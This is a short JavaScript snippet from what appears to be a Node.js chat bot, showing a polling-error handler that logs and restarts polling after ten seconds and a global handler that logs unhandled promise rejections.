appBot.on("polling_error", (err) => {
    logError(err, "appBot.polling_error");
    // Auto-recover: re-initialize polling after 10 seconds
    setTimeout(() => {
        appBot.startPolling({ polling: true }).catch(() => {});
    }, 10000);
});

// ---------- UNHANDLED REJECTION HANDLER ----------
process.on("unhandledRejection", (reason, promise) => {
    console.error("[FATAL] Unhandled Rejection at:", promise);
    console.error("[FATAL] Reason:", reason);
});
